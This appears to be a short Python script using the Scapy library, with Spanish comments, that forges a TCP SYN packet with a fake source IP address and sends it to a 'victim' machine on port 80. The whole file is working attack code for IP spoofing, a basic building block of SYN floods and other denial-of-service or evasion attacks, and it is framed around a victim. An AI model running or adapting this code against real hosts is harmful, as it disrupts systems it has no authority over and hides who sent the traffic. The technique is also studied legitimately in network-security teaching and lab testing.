from scapy.all import *

# IP falsa que quieres usar como origen
ip_falsa = "192.168.1.100" # IP china de dudosa procedencia....

# IP de la víctima o destino
ip_destino = "192.168.1.10"

# Puerto destino (puede ser cualquier puerto abierto en la máquina destino)
puerto_destino = 80

# Crear paquete IP y TCP con spoofing
paquete = IP(src=ip_falsa, dst=ip_destino) / TCP(sport=1234, dport=puerto_destino, flags="S")

# Enviar el paquete
send(paquete, verbose=1)
